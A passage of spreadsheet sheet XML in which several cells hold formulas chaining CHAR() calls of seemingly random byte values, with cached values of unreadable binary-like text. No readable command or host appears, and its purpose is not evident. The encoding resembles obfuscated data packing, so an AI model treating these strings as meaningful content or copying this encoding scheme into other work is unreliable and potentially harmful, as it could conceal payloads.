        <f>CHAR(165)&amp;CHAR(48)&amp;CHAR(249)&amp;CHAR(145)&amp;CHAR(205)&amp;CHAR(40)&amp;CHAR(105)&amp;CHAR(204)&amp;CHAR(31)&amp;CHAR(5)&amp;CHAR(101)&amp;CHAR(4)&amp;CHAR(200)&amp;CHAR(73)&amp;CHAR(193)&amp;CHAR(107)&amp;CHAR(182)&amp;CHAR(114)&amp;CHAR(5)&amp;CHAR(229)&amp;CHAR(8)&amp;CHAR(105)&amp;CHAR(157)&amp;CHAR(152)&amp;CHAR(193)&amp;CHAR(190)&amp;CHAR(224)&amp;CHAR(107)&amp;CHAR(186)&amp;CHAR(33)&amp;CHAR(195)&amp;CHAR(165)&amp;CHAR(110)&amp;CHAR(57)&amp;CHAR(79)&amp;CHAR(66)&amp;CHAR(157)&amp;CHAR(44)&amp;CHAR(123)&amp;CHAR(165)&amp;CHAR(157)&amp;CHAR(34)&amp;CHAR(131)&amp;CHAR(170)&amp;CHAR(141)&amp;CHAR(10)&amp;CHAR(223)&amp;CHAR(65)&amp;CHAR(122)&amp;CHAR(147)&amp;CHAR(138)&amp;CHAR(219)&amp;CHAR(80)&amp;CHAR(122)&amp;CHAR(167)&amp;CHAR(160)&amp;CHAR(176)&amp;CHAR(56)&amp;CHAR(187)&amp;CHAR(109)&amp;CHAR(234)&amp;CHAR(20)&amp;CHAR(72)&amp;CHAR(191)&amp;CHAR(209)&amp;CHAR(83)&amp;CHAR(4)&amp;CHAR(167)&amp;CHAR(246)&amp;CHAR(104)&amp;CHAR(205)&amp;CHAR(92)&amp;CHAR(175)&amp;CHAR(96)&amp;CHAR(225)&amp;CHAR(7)&amp;CHAR(77)&amp;CHAR(137)&amp;CHAR(185)&amp;CHAR(88)&amp;CHAR(49)&amp;CHAR(57)&amp;CHAR(201)&amp;CHAR(221)&amp;CHAR(65)&amp;CHAR(137)&amp;CHAR(89)&amp;CHAR(19)&amp;CHAR(218)&amp;CHAR(205)&amp;CHAR(20)&amp;CHAR(43)&amp;CHAR(159)&amp;CHAR(101)&amp;CHAR(253)&amp;CHAR(44)&amp;CHAR(28)&amp;CHAR(116)&amp;CHAR(27)&amp;CHAR(165)&amp;CHAR(241)&amp;CHAR(229)&amp;CHAR(110)&amp;CHAR(71)&amp;CHAR(125)&amp;CHAR(181)&amp;CHAR(107)&amp;CHAR(206)&amp;CHAR(48)&amp;CHAR(124)&amp;CHAR(236)&amp;CHAR(63)&amp;CHAR(88)&amp;CHAR(217)&amp;CHAR(135)&amp;CHAR(159)&amp;CHAR(157)&amp;CHAR(159)&amp;CHAR(60)&amp;CHAR(195)&amp;CHAR(184)&amp;CHAR(194)&amp;CHAR(102)&amp;CHAR(125)&amp;CHAR(2)&amp;CHAR(32)&amp;CHAR(56)&amp;CHAR(110)&amp;CHAR(204)&amp;CHAR(60)&amp;CHAR(212)&amp;CHAR(105)&amp;CHAR(190)&amp;CHAR(30)&amp;CHAR(165)&amp;CHAR(172)&amp;CHAR(180)&amp;CHAR(161)&amp;CHAR(243)&amp;CHAR(55)&amp;CHAR(138)&amp;CHAR(229)&amp;CHAR(148)&amp;CHAR(155)&amp;CHAR(210)&amp;CHAR(252)&amp;CHAR(28)&amp;CHAR(202)&amp;CHAR(21)&amp;CHAR(245)&amp;CHAR(115)&amp;CHAR(58)&amp;CHAR(209)&amp;CHAR(73)&amp;CHAR(152)&amp;CHAR(245)&amp;CHAR(154)&amp;CHAR(106)&amp;CHAR(213)&amp;CHAR(185)&amp;CHAR(241)&amp;CHAR(125)&amp;CHAR(233)&amp;CHAR(82)&amp;CHAR(119)&amp;CHAR(156)&amp;CHAR(31)&amp;CHAR(33)&amp;CHAR(105)&amp;CHAR(139)&amp;CHAR(81)&amp;CHAR(152)&amp;CHAR(29)&amp;CHAR(20)&amp;CHAR(203)&amp;CHAR(23)&amp;CHAR(114)&amp;CHAR(156)&amp;CHAR(243)&amp;CHAR(191)&amp;CHAR(69)&amp;CHAR(92)&amp;CHAR(241)&amp;CHAR(149)&amp;CHAR(99)&amp;CHAR(33)&amp;CHAR(41)&amp;CHAR(192)&amp;CHAR(114)&amp;CHAR(56)&amp;CHAR(113)&amp;CHAR(5)&amp;CHAR(52)&amp;CHAR(24)&amp;CHAR(49)&amp;CHAR(107)&amp;CHAR(90)&amp;CHAR(45)&amp;CHAR(253)&amp;CHAR(102)&amp;CHAR(21)&amp;CHAR(178)&amp;CHAR(156)&amp;CHAR(100)&amp;CHAR(39)&amp;CHAR(58)&amp;CHAR(104)&amp;CHAR(37)&amp;CHAR(12)&amp;CHAR(237)&amp;CHAR(72)&amp;CHAR(26)&amp;CHAR(195)&amp;CHAR(103)&amp;CHAR(102)&amp;CHAR(223)&amp;CHAR(212)&amp;CHAR(246)&amp;CHAR(54)&amp;CHAR(5)&amp;CHAR(116)&amp;CHAR(147)&amp;CHAR(56)&amp;CHAR(30)&amp;CHAR(215)&amp;CHAR(197)&amp;CHAR(53)&amp;CHAR(78)&amp;CHAR(63)&amp;CHAR(113)&amp;CHAR(137)&amp;CHAR(6)&amp;CHAR(66)&amp;CHAR(193)&amp;CHAR(242)&amp;CHAR(133)&amp;CHAR(153)&amp;CHAR(119)&amp;CHAR(162)&amp;CHAR(190)&amp;CHAR(46)&amp;CHAR(81)&amp;CHAR(205)&amp;CHAR(232)&amp;CHAR(129)&amp;CHAR(202)&amp;CHAR(174)&amp;CHAR(149)&amp;CHAR(138)&amp;CHAR(173)&amp;CHAR(48)&amp;CHAR(138)&amp;CHAR(230)&amp;CHAR(189)&amp;CHAR(190)</f>
        <v>¥0ù‘Í(iÌ_x001F__x0005_e_x0004_ÈIÁk¶r_x0005_å_x0008_i˜Á¾àkº!Ã¥n9OB,{¥"ƒª
ßAz“ŠÛPz§ °8»mê_x0014_H¿ÑS_x0004_§öhÍ\¯`á_x0007_M‰¹X19ÉÝA‰Y_x0013_ÚÍ_x0014_+Ÿeý,_x001C_t_x001B_¥ñånG}µkÎ0|ì?XÙ‡ŸŸ&lt;Ã¸Âf}_x0002_ 8nÌ&lt;Ôi¾_x001E_¥¬´¡ó7Šå”›Òü_x001C_Ê_x0015_õs:ÑI˜õšjÕ¹ñ}éRwœ_x001F_!i‹Q˜_x001D__x0014_Ë_x0017_rœó¿E\ñ•c!)Àr8q_x0005_4_x0018_1kZ-ýf_x0015_²œd':h%_x000C_íH_x001A_ÃgfßÔö6_x0005_t“8_x001E_×Å5N?q‰_x0006_BÁò…™w¢¾.QÍèÊ®•Š­0Šæ½¾</v>
      </c>
      <c r="C53" t="str">
        <f>CHAR(189)&amp;CHAR(233)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(221)&amp;CHAR(188)&amp;CHAR(250)&amp;CHAR(126)&amp;CHAR(173)&amp;CHAR(194)</f>
        <v>½é‘[Ý¼ú~­Â</v>
      </c>
    </row>
    <row r="54" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B54" t="str">
        <f>CHAR(137)&amp;CHAR(50)&amp;CHAR(243)&amp;CHAR(152)&amp;CHAR(223)&amp;CHAR(235)&amp;CHAR(137)&amp;CHAR(179)&amp;CHAR(12)&amp;CHAR(127)&amp;CHAR(173)&amp;CHAR(23)&amp;CHAR(54)&amp;CHAR(9)&amp;CHAR(37)&amp;CHAR(224)&amp;CHAR(130)&amp;CHAR(221)&amp;CHAR(182)&amp;CHAR(44)&amp;CHAR(238)&amp;CHAR(134)&amp;CHAR(54)&amp;CHAR(103)&amp;CHAR(111)&amp;CHAR(35)&amp;CHAR(254)&amp;CHAR(114)&amp;CHAR(224)&amp;CHAR(16)&amp;CHAR(83)&amp;CHAR(55)&amp;CHAR(193)&amp;CHAR(214)&amp;CHAR(108)&amp;CHAR(237)&amp;CHAR(65)&amp;CHAR(110)&amp;CHAR(23)&amp;CHAR(106)&amp;CHAR(101)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(251)&amp;CHAR(57)&amp;CHAR(21)&amp;CHAR(17)&amp;CHAR(56)&amp;CHAR(207)&amp;CHAR(223)&amp;CHAR(234)&amp;CHAR(200)&amp;CHAR(221)&amp;CHAR(78)&amp;CHAR(44)&amp;CHAR(107)&amp;CHAR(88)&amp;CHAR(51)&amp;CHAR(222)&amp;CHAR(50)&amp;CHAR(220)&amp;CHAR(117)&amp;CHAR(44)&amp;CHAR(252)&amp;CHAR(247)&amp;CHAR(203)&amp;CHAR(47)&amp;CHAR(138)&amp;CHAR(105)&amp;CHAR(165)&amp;CHAR(32)&amp;CHAR(203)&amp;CHAR(160)&amp;CHAR(11)&amp;CHAR(63)&amp;CHAR(82)&amp;CHAR(38)&amp;CHAR(85)&amp;CHAR(126)&amp;CHAR(113)&amp;CHAR(233)&amp;CHAR(133)&amp;CHAR(27)&amp;CHAR(83)&amp;CHAR(143)&amp;CHAR(195)&amp;CHAR(48)&amp;CHAR(247)&amp;CHAR(129)&amp;CHAR(245)&amp;CHAR(36)&amp;CHAR(201)&amp;CHAR(151)&amp;CHAR(96)&amp;CHAR(201)&amp;CHAR(66)&amp;CHAR(98)&amp;CHAR(62)&amp;CHAR(184)&amp;CHAR(155)&amp;CHAR(176)&amp;CHAR(71)&amp;CHAR(21)&amp;CHAR(122)&amp;CHAR(180)&amp;CHAR(182)&amp;CHAR(154)&amp;CHAR(198)&amp;CHAR(243)&amp;CHAR(213)&amp;CHAR(40)&amp;CHAR(109)&amp;CHAR(243)&amp;CHAR(9)&amp;CHAR(169)&amp;CHAR(39)&amp;CHAR(251)&amp;CHAR(64)&amp;CHAR(56)&amp;CHAR(177)&amp;CHAR(39)&amp;CHAR(218)&amp;CHAR(13)&amp;CHAR(243)&amp;CHAR(250)&amp;CHAR(249)&amp;CHAR(192)&amp;CHAR(52)&amp;CHAR(77)&amp;CHAR(132)&amp;CHAR(160)&amp;CHAR(15)&amp;CHAR(227)&amp;CHAR(111)&amp;CHAR(65)&amp;CHAR(223)&amp;CHAR(233)&amp;CHAR(139)&amp;CHAR(119)&amp;CHAR(20)&amp;CHAR(42)&amp;CHAR(8)&amp;CHAR(52)&amp;CHAR(196)&amp;CHAR(84)&amp;CHAR(152)&amp;CHAR(136)&amp;CHAR(248)&amp;CHAR(16)&amp;CHAR(40)&amp;CHAR(107)&amp;CHAR(227)&amp;CHAR(100)&amp;CHAR(36)&amp;CHAR(12)&amp;CHAR(132)&amp;CHAR(217)&amp;CHAR(83)&amp;CHAR(84)&amp;CHAR(19)&amp;CHAR(229)&amp;CHAR(35)&amp;CHAR(139)&amp;CHAR(255)&amp;CHAR(219)&amp;CHAR(29)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(72)&amp;CHAR(159)&amp;CHAR(183)&amp;CHAR(109)&amp;CHAR(148)&amp;CHAR(75)&amp;CHAR(155)&amp;CHAR(197)&amp;CHAR(184)&amp;CHAR(207)&amp;CHAR(103)&amp;CHAR(172)&amp;CHAR(248)&amp;CHAR(198)&amp;CHAR(131)&amp;CHAR(93)&amp;CHAR(219)&amp;CHAR(199)&amp;CHAR(69)&amp;CHAR(76)&amp;CHAR(117)&amp;CHAR(84)&amp;CHAR(55)&amp;CHAR(225)&amp;CHAR(127)&amp;CHAR(56)&amp;CHAR(240)&amp;CHAR(165)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(78)&amp;CHAR(246)&amp;CHAR(34)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(22)&amp;CHAR(83)&amp;CHAR(114)&amp;CHAR(76)&amp;CHAR(240)&amp;CHAR(139)&amp;CHAR(9)&amp;CHAR(171)&amp;CHAR(82)&amp;CHAR(121)&amp;CHAR(109)&amp;CHAR(35)&amp;CHAR(243)&amp;CHAR(106)&amp;CHAR(118)&amp;CHAR(10)&amp;CHAR(188)&amp;CHAR(170)&amp;CHAR(134)&amp;CHAR(200)&amp;CHAR(57)&amp;CHAR(141)&amp;CHAR(74)&amp;CHAR(245)&amp;CHAR(208)&amp;CHAR(148)&amp;CHAR(129)&amp;CHAR(8)&amp;CHAR(254)&amp;CHAR(107)&amp;CHAR(91)&amp;CHAR(108)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(19)&amp;CHAR(15)&amp;CHAR(217)&amp;CHAR(215)&amp;CHAR(234)&amp;CHAR(32)&amp;CHAR(123)&amp;CHAR(223)&amp;CHAR(251)&amp;CHAR(115)&amp;CHAR(99)&amp;CHAR(158)&amp;CHAR(148)&amp;CHAR(177)&amp;CHAR(160)&amp;CHAR(38)&amp;CHAR(64)&amp;CHAR(212)</f>
        <v>‰2ó˜ßë‰³_x000C_­_x0017_6	%à‚Ý¶,î†6go#þrà_x0010_S7ÁÖlíAn_x0017_je£0û9_x0015__x0011_8ÏßêÈÝN,kX3Þ2Üu,ü÷Ë/Ši¥ Ë _x000B_?R&amp;U~qé…_x001B_SÃ0÷õ$É—`ÉBb&gt;¸›°G_x0015_z´¶šÆóÕ(mó	©'û@8±'Ú_x000D_óúùÀ4M„ _x000F_ãoAßé‹w_x0014_*_x0008_4ÄT˜ˆø_x0010_(kãd$_x000C_„ÙST_x0013_å#‹ÿÛ_x001D_‚÷HŸ·m”K›Å¸Ïg¬øÆƒ]ÛÇELuT7á8ð¥_x000F__x0002_Nö"_x0002__x000E__x0016_SrLð‹	«Rym#ójv
¼ª†È9JõÐ”_x0008_þk[lŒO_x0013__x000F_Ù×ê {ßûscž”± &amp;@Ô</v>
      </c>
      <c r="C54" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(188)&amp;CHAR(242)&amp;CHAR(186)&amp;CHAR(208)&amp;CHAR(162)&amp;CHAR(26)&amp;CHAR(91)</f>
        <v>‘[¸¼òºÐ¢_x001A_[</v>
      </c>
    </row>
    <row r="55" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B55" t="str">
        <f>CHAR(193)&amp;CHAR(38)&amp;CHAR(108)&amp;CHAR(129)&amp;CHAR(181)&amp;CHAR(238)&amp;CHAR(2)&amp;CHAR(141)&amp;CHAR(129)&amp;CHAR(245)&amp;CHAR(124)&amp;CHAR(115)&amp;CHAR(54)&amp;CHAR(40)&amp;CHAR(91)&amp;CHAR(19)&amp;CHAR(44)&amp;CHAR(205)&amp;CHAR(182)&amp;CHAR(7)&amp;CHAR(241)&amp;CHAR(125)&amp;CHAR(248)&amp;CHAR(222)&amp;CHAR(21)&amp;CHAR(3)&amp;CHAR(178)&amp;CHAR(209)&amp;CHAR(127)&amp;CHAR(129)&amp;CHAR(28)&amp;CHAR(255)&amp;CHAR(147)&amp;CHAR(225)&amp;CHAR(72)&amp;CHAR(114)&amp;CHAR(21)&amp;CHAR(51)&amp;CHAR(241)&amp;CHAR(120)&amp;CHAR(137)&amp;CHAR(41)&amp;CHAR(25)&amp;CHAR(209)&amp;CHAR(180)&amp;CHAR(204)&amp;CHAR(215)&amp;CHAR(8)&amp;CHAR(202)&amp;CHAR(247)&amp;CHAR(75)&amp;CHAR(124)&amp;CHAR(5)&amp;CHAR(31)&amp;CHAR(96)&amp;CHAR(218)&amp;CHAR(71)&amp;CHAR(70)&amp;CHAR(102)&amp;CHAR(70)&amp;CHAR(183)&amp;CHAR(155)&amp;CHAR(80)&amp;CHAR(203)&amp;CHAR(75)&amp;CHAR(193)&amp;CHAR(224)&amp;CHAR(179)&amp;CHAR(70)&amp;CHAR(8)&amp;CHAR(98)&amp;CHAR(45)&amp;CHAR(225)&amp;CHAR(69)&amp;CHAR(228)&amp;CHAR(190)&amp;CHAR(246)&amp;CHAR(230)&amp;CHAR(24)&amp;CHAR(134)&amp;CHAR(197)&amp;CHAR(60)&amp;CHAR(9)&amp;CHAR(28)&amp;CHAR(208)&amp;CHAR(167)&amp;CHAR(147)&amp;CHAR(59)&amp;CHAR(53)&amp;CHAR(100)&amp;CHAR(174)&amp;CHAR(180)&amp;CHAR(228)&amp;CHAR(115)&amp;CHAR(115)&amp;CHAR(98)&amp;CHAR(249)&amp;CHAR(41)&amp;CHAR(26)&amp;CHAR(21)&amp;CHAR(132)&amp;CHAR(197)&amp;CHAR(30)&amp;CHAR(111)&amp;CHAR(16)&amp;CHAR(152)&amp;CHAR(42)&amp;CHAR(67)&amp;CHAR(101)&amp;CHAR(247)&amp;CHAR(121)&amp;CHAR(41)&amp;CHAR(14)&amp;CHAR(236)&amp;CHAR(172)&amp;CHAR(233)&amp;CHAR(101)&amp;CHAR(61)&amp;CHAR(230)&amp;CHAR(149)&amp;CHAR(91)&amp;CHAR(150)&amp;CHAR(174)&amp;CHAR(70)&amp;CHAR(89)&amp;CHAR(230)&amp;CHAR(139)&amp;CHAR(49)&amp;CHAR(150)&amp;CHAR(160)&amp;CHAR(54)&amp;CHAR(154)&amp;CHAR(10)&amp;CHAR(83)&amp;CHAR(53)&amp;CHAR(238)&amp;CHAR(183)&amp;CHAR(73)&amp;CHAR(98)&amp;CHAR(253)&amp;CHAR(207)&amp;CHAR(178)&amp;CHAR(169)&amp;CHAR(2)&amp;CHAR(79)&amp;CHAR(52)&amp;CHAR(15)&amp;CHAR(171)&amp;CHAR(252)&amp;CHAR(162)&amp;CHAR(214)&amp;CHAR(132)&amp;CHAR(144)&amp;CHAR(6)&amp;CHAR(142)&amp;CHAR(251)&amp;CHAR(135)&amp;CHAR(248)&amp;CHAR(3)&amp;CHAR(212)&amp;CHAR(66)&amp;CHAR(99)&amp;CHAR(55)&amp;CHAR(93)&amp;CHAR(166)&amp;CHAR(9)&amp;CHAR(73)&amp;CHAR(151)&amp;CHAR(63)&amp;CHAR(43)&amp;CHAR(173)&amp;CHAR(63)&amp;CHAR(55)&amp;CHAR(16)&amp;CHAR(173)&amp;CHAR(40)&amp;CHAR(69)&amp;CHAR(147)&amp;CHAR(36)&amp;CHAR(152)&amp;CHAR(179)&amp;CHAR(94)&amp;CHAR(114)&amp;CHAR(185)&amp;CHAR(134)&amp;CHAR(93)&amp;CHAR(152)&amp;CHAR(4)&amp;CHAR(213)&amp;CHAR(133)&amp;CHAR(31)&amp;CHAR(115)&amp;CHAR(102)&amp;CHAR(99)&amp;CHAR(171)&amp;CHAR(132)&amp;CHAR(118)&amp;CHAR(37)&amp;CHAR(94)&amp;CHAR(151)&amp;CHAR(190)&amp;CHAR(250)&amp;CHAR(59)&amp;CHAR(154)&amp;CHAR(180)&amp;CHAR(16)&amp;CHAR(157)&amp;CHAR(127)&amp;CHAR(31)&amp;CHAR(156)&amp;CHAR(207)&amp;CHAR(43)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(162)&amp;CHAR(28)&amp;CHAR(240)&amp;CHAR(13)&amp;CHAR(4)&amp;CHAR(35)&amp;CHAR(112)&amp;CHAR(240)&amp;CHAR(27)&amp;CHAR(179)&amp;CHAR(83)&amp;CHAR(41)&amp;CHAR(159)&amp;CHAR(34)&amp;CHAR(156)&amp;CHAR(210)&amp;CHAR(10)&amp;CHAR(42)&amp;CHAR(28)&amp;CHAR(63)&amp;CHAR(150)&amp;CHAR(243)&amp;CHAR(16)&amp;CHAR(179)&amp;CHAR(89)&amp;CHAR(235)&amp;CHAR(150)&amp;CHAR(91)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(212)&amp;CHAR(245)&amp;CHAR(15)&amp;CHAR(83)&amp;CHAR(45)&amp;CHAR(246)&amp;CHAR(208)&amp;CHAR(80)&amp;CHAR(188)&amp;CHAR(31)&amp;CHAR(32)</f>
        <v xml:space="preserve">Á&amp;lµî_x0002_õ|s6([_x0013_,Í¶_x0007_ñ}øÞ_x0015__x0003_²Ñ_x001C_ÿ“áHr_x0015_3ñx‰)_x0019_Ñ´Ì×_x0008_Ê÷K|_x0005__x001F_`ÚGFfF·›PËKÁà³F_x0008_b-áEä¾öæ_x0018_†Å&lt;	_x001C_Ð§“;5d®´ässbù)_x001A__x0015_„Å_x001E_o_x0010_˜*Ce÷y)_x000E_ì¬ée=æ•[–®FYæ‹1– 6š
S5î·IbýÏ²©_x0002_O4_x000F_«ü¢Ö„_x0006_Žû‡ø_x0003_ÔBc7]¦	I—?+­?7_x0010_­(E“$˜³^r¹†]˜_x0004_Õ…_x001F_sfc«„v%^—¾ú;š´_x0010__x001F_œÏ+µÖ¢_x001C_ð_x000D__x0004_#pð_x001B_³S)Ÿ"œÒ
*_x001C_?–ó_x0010_³Yë–[×ÕÔõ_x000F_S-öÐP¼_x001F_ </v>
      </c>
      <c r="C55" t="str">
        <f>CHAR(240)&amp;CHAR(127)&amp;CHAR(113)&amp;CHAR(31)&amp;CHAR(196)&amp;CHAR(97)&amp;CHAR(157)&amp;CHAR(126)&amp;CHAR(144)&amp;CHAR(244)</f>
        <v>ðq_x001F_Äa~ô</v>
      </c>
    </row>
    <row r="56" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B56" t="str">
        <f>CHAR(246)&amp;CHAR(32)&amp;CHAR(199)&amp;CHAR(238)&amp;CHAR(201)&amp;CHAR(126)&amp;CHAR(11)&amp;CHAR(209)&amp;CHAR(44)&amp;CHAR(7)&amp;CHAR(120)&amp;CHAR(79)&amp;CHAR(100)&amp;CHAR(109)&amp;CHAR(181)&amp;CHAR(12)&amp;CHAR(147)&amp;CHAR(122)&amp;CHAR(231)&amp;CHAR(119)&amp;CHAR(245)&amp;CHAR(124)&amp;CHAR(143)&amp;CHAR(247)&amp;CHAR(247)&amp;CHAR(152)&amp;CHAR(125)&amp;CHAR(46)&amp;CHAR(61)&amp;CHAR(125)&amp;CHAR(103)&amp;CHAR(14)&amp;CHAR(170)&amp;CHAR(127)&amp;CHAR(158)&amp;CHAR(135)&amp;CHAR(150)&amp;CHAR(4)&amp;CHAR(240)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(26)&amp;CHAR(193)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(60)&amp;CHAR(49)&amp;CHAR(141)&amp;CHAR(133)&amp;CHAR(185)&amp;CHAR(161)&amp;CHAR(86)&amp;CHAR(92)&amp;CHAR(41)&amp;CHAR(215)&amp;CHAR(187)&amp;CHAR(159)&amp;CHAR(250)&amp;CHAR(218)&amp;CHAR(15)&amp;CHAR(220)&amp;CHAR(231)&amp;CHAR(111)&amp;CHAR(109)&amp;CHAR(210)&amp;CHAR(160)&amp;CHAR(179)&amp;CHAR(55)&amp;CHAR(96)&amp;CHAR(128)&amp;CHAR(188)&amp;CHAR(145)&amp;CHAR(165)&amp;CHAR(76)&amp;CHAR(151)&amp;CHAR(79)&amp;CHAR(19)&amp;CHAR(205)&amp;CHAR(58)&amp;CHAR(202)&amp;CHAR(109)&amp;CHAR(133)&amp;CHAR(66)&amp;CHAR(223)&amp;CHAR(111)&amp;CHAR(142)&amp;CHAR(193)&amp;CHAR(185)&amp;CHAR(93)&amp;CHAR(174)&amp;CHAR(13)&amp;CHAR(31)&amp;CHAR(61)&amp;CHAR(81)&amp;CHAR(54)&amp;CHAR(251)&amp;CHAR(243)&amp;CHAR(105)&amp;CHAR(60)&amp;CHAR(167)&amp;CHAR(37)&amp;CHAR(239)&amp;CHAR(37)&amp;CHAR(150)&amp;CHAR(167)&amp;CHAR(129)&amp;CHAR(39)&amp;CHAR(113)&amp;CHAR(124)&amp;CHAR(199)&amp;CHAR(73)&amp;CHAR(171)&amp;CHAR(113)&amp;CHAR(69)&amp;CHAR(41)&amp;CHAR(35)&amp;CHAR(76)&amp;CHAR(71)&amp;CHAR(101)&amp;CHAR(2)&amp;CHAR(161)&amp;CHAR(201)&amp;CHAR(135)&amp;CHAR(142)&amp;CHAR(91)&amp;CHAR(90)&amp;CHAR(12)&amp;CHAR(235)&amp;CHAR(255)&amp;CHAR(148)&amp;CHAR(143)&amp;CHAR(182)&amp;CHAR(13)&amp;CHAR(140)&amp;CHAR(86)&amp;CHAR(113)&amp;CHAR(205)&amp;CHAR(88)&amp;CHAR(200)&amp;CHAR(84)&amp;CHAR(120)&amp;CHAR(218)&amp;CHAR(86)&amp;CHAR(174)&amp;CHAR(21)&amp;CHAR(154)&amp;CHAR(139)&amp;CHAR(245)&amp;CHAR(113)&amp;CHAR(13)&amp;CHAR(186)&amp;CHAR(125)&amp;CHAR(103)&amp;CHAR(167)&amp;CHAR(37)&amp;CHAR(72)&amp;CHAR(48)&amp;CHAR(121)&amp;CHAR(69)&amp;CHAR(250)&amp;CHAR(103)&amp;CHAR(27)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(232)&amp;CHAR(54)&amp;CHAR(20)&amp;CHAR(126)&amp;CHAR(50)&amp;CHAR(5)&amp;CHAR(105)&amp;CHAR(136)&amp;CHAR(122)&amp;CHAR(166)&amp;CHAR(220)&amp;CHAR(172)&amp;CHAR(181)&amp;CHAR(134)&amp;CHAR(113)&amp;CHAR(93)&amp;CHAR(214)&amp;CHAR(18)&amp;CHAR(159)&amp;CHAR(67)&amp;CHAR(16)&amp;CHAR(6)&amp;CHAR(188)&amp;CHAR(217)&amp;CHAR(206)&amp;CHAR(92)&amp;CHAR(63)&amp;CHAR(219)&amp;CHAR(202)&amp;CHAR(132)&amp;CHAR(64)&amp;CHAR(153)&amp;CHAR(113)&amp;CHAR(121)&amp;CHAR(184)&amp;CHAR(49)&amp;CHAR(84)&amp;CHAR(188)&amp;CHAR(218)&amp;CHAR(239)&amp;CHAR(58)&amp;CHAR(159)&amp;CHAR(108)&amp;CHAR(1)&amp;CHAR(139)&amp;CHAR(9)&amp;CHAR(87)&amp;CHAR(141)&amp;CHAR(137)&amp;CHAR(1)&amp;CHAR(29)&amp;CHAR(141)&amp;CHAR(219)&amp;CHAR(18)&amp;CHAR(109)&amp;CHAR(192)&amp;CHAR(160)&amp;CHAR(143)&amp;CHAR(180)&amp;CHAR(39)&amp;CHAR(217)&amp;CHAR(247)&amp;CHAR(150)&amp;CHAR(146)&amp;CHAR(246)&amp;CHAR(176)&amp;CHAR(153)&amp;CHAR(33)&amp;CHAR(91)&amp;CHAR(107)&amp;CHAR(31)&amp;CHAR(130)&amp;CHAR(202)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(32)&amp;CHAR(245)&amp;CHAR(101)&amp;CHAR(225)&amp;CHAR(170)&amp;CHAR(253)&amp;CHAR(139)&amp;CHAR(144)&amp;CHAR(240)&amp;CHAR(153)&amp;CHAR(58)&amp;CHAR(49)&amp;CHAR(129)&amp;CHAR(234)&amp;CHAR(130)&amp;CHAR(107)</f>
        <v>ö ÇîÉ~_x000B_Ñ,_x0007_xOdmµ_x000C_“zçwõ|÷÷˜}.=}g_x000E_ªž‡–_x0004_ðƒJ_x001A_ÁÊ4&lt;1…¹¡V\)×»ŸúÚ_x000F_ÜçomÒ ³7`€¼‘¥L—O_x0013_Í:Êm…BßoŽÁ¹]®_x000D__x001F_=Q6ûói&lt;§%ï%–§'q|ÇI«qE)#LGe_x0002_¡É‡Ž[Z_x000C_ëÿ”¶_x000D_ŒVqÍXÈTxÚV®_x0015_š‹õq_x000D_º}g§%H0yEúg_x001B__x0006_Ëè6_x0014_~2_x0005_iˆz¦Ü¬µ†q]Ö_x0012_ŸC_x0010__x0006_¼ÙÎ\?ÛÊ„@™qy¸1T¼Úï:Ÿl_x0001_‹	W‰_x0001__x001D_Û_x0012_mÀ ´'Ù÷–’ö°™![k_x001F_‚Ê_x0011_Ž õeáªý‹ð™:1ê‚k</v>
      </c>
      <c r="C56" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(193)&amp;CHAR(105)&amp;CHAR(80)&amp;CHAR(51)&amp;CHAR(244)&amp;CHAR(121)&amp;CHAR(116)&amp;CHAR(208)</f>
        <v>qzÁiP3ôytÐ</v>
      </c>
    </row>
    <row r="57" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B57" t="str">
        <f>CHAR(229)&amp;CHAR(236)&amp;CHAR(201)&amp;CHAR(83)&amp;CHAR(206)&amp;CHAR(105)&amp;CHAR(182)&amp;CHAR(75)&amp;CHAR(113)&amp;CHAR(145)&amp;CHAR(54)&amp;CHAR(239)&amp;CHAR(189)&amp;CHAR(180)&amp;CHAR(77)&amp;CHAR(163)&amp;CHAR(201)&amp;CHAR(230)&amp;CHAR(233)&amp;CHAR(106)&amp;CHAR(84)&amp;CHAR(88)&amp;CHAR(113)&amp;CHAR(60)&amp;CHAR(39)&amp;CHAR(89)&amp;CHAR(40)&amp;CHAR(65)&amp;CHAR(241)&amp;CHAR(174)&amp;CHAR(216)&amp;CHAR(29)&amp;CHAR(160)&amp;CHAR(25)&amp;CHAR(58)&amp;CHAR(250)&amp;CHAR(129)&amp;CHAR(132)&amp;CHAR(166)&amp;CHAR(122)&amp;CHAR(23)&amp;CHAR(187)&amp;CHAR(201)&amp;CHAR(139)&amp;CHAR(208)&amp;CHAR(70)&amp;CHAR(27)&amp;CHAR(54)&amp;CHAR(34)&amp;CHAR(255)&amp;CHAR(110)&amp;CHAR(18)&amp;CHAR(173)&amp;CHAR(154)&amp;CHAR(42)&amp;CHAR(150)&amp;CHAR(142)&amp;CHAR(208)&amp;CHAR(49)&amp;CHAR(207)&amp;CHAR(131)&amp;CHAR(52)&amp;CHAR(247)&amp;CHAR(187)&amp;CHAR(71)&amp;CHAR(187)&amp;CHAR(145)&amp;CHAR(10)&amp;CHAR(21)&amp;CHAR(172)&amp;CHAR(172)&amp;CHAR(61)&amp;CHAR(248)&amp;CHAR(186)&amp;CHAR(220)&amp;CHAR(185)&amp;CHAR(236)&amp;CHAR(45)&amp;CHAR(11)&amp;CHAR(211)&amp;CHAR(95)&amp;CHAR(245)&amp;CHAR(102)&amp;CHAR(218)&amp;CHAR(243)&amp;CHAR(236)&amp;CHAR(48)&amp;CHAR(155)&amp;CHAR(16)&amp;CHAR(245)&amp;CHAR(118)&amp;CHAR(205)&amp;CHAR(213)&amp;CHA